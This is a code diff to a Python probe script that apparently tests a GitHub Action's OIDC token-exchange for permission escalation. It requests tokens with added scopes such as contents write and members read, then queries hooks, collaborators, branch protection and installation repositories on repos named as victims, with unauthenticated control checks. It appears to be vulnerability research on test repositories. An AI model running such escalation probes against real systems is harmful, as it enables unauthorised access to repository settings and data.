@@ -143,14 +143,35 @@ for aud in ["https://api.anthropic.com", "api://AzureADTokenExchange", "https://
 idt3 = get_id_token("claude-code-github-action")
 st3, data3, tok3 = exchange(idt3, {"permissions": {"actions": "read", "administration": "read"}},
                             "perm-escalate")
-if tok3:
-    gh_get("/repos/N0tre3l/cca-fork-e2e-victim/actions/workflows", tok3, "perm-escalate")
-    gh_get("/repos/N0tre3l/cca-fork-e2e-victim/branches/main/protection", tok3, "perm-escalate")
-    gh_get("/installation/repositories", tok3, "perm-escalate")
+idt3b = get_id_token("claude-code-github-action")
+st3b, data3b, tok3b = exchange(
+    idt3b,
+    {"permissions": {"contents": "write", "actions": "read", "administration": "read", "members": "read"}},
+    "perm-escalate-with-contents")
+if tok3b:
+    gh_get("/repos/N0tre3l/cca-fork-e2e-victim/actions/workflows", tok3b, "perm-escalate-with-contents")
+    gh_get("/repos/N0tre3l/cca-fork-e2e-victim/branches/main/protection", tok3b, "perm-escalate-with-contents")
+    gh_get("/repos/N0tre3l/cca-fork-e2e-victim/hooks", tok3b, "perm-escalate-with-contents")
+    gh_get("/repos/N0tre3l/cca-fork-e2e-victim/collaborators", tok3b, "perm-escalate-with-contents")
+    gh_get("/installation/repositories", tok3b, "perm-escalate-with-contents")
 
 # ---------- T4: unknown permission key ----------
 idt4 = get_id_token("claude-code-github-action")
 exchange(idt4, {"permissions": {"totally_bogus_scope": "write"}}, "perm-bogus")
+
+# ---------- T6: scoping controls ----------
+if tok:
+    # public-repo metadata is world-readable; admin-ish endpoints are the real test
+    gh_get("/repos/N0tre3l/poc-victim/hooks", tok, "scope-control")
+    gh_get("/repos/N0tre3l/poc-victim/actions/workflows", tok, "scope-control")
+    gh_get("/repos/N0tre3l/poc-victim/contents/README.md", tok, "scope-control")
+req = urllib.request.Request("https://api.github.com/repos/N0tre3l/poc-victim",
+                             headers={"Accept": "application/vnd.github+json"})
+try:
+    with urllib.request.urlopen(req, timeout=30) as resp:
+        print("UNAUTH control GET /repos/N0tre3l/poc-victim ->", resp.status, "(public metadata is world-readable)")
+except urllib.error.HTTPError as e:
+    print("UNAUTH control GET /repos/N0tre3l/poc-victim ->", e.code)
 
 # ---------- T5: cross-audience OIDC token minted for WIF-style audience, exchange anyway done in T2 ----------
 print("=== probe done ===")
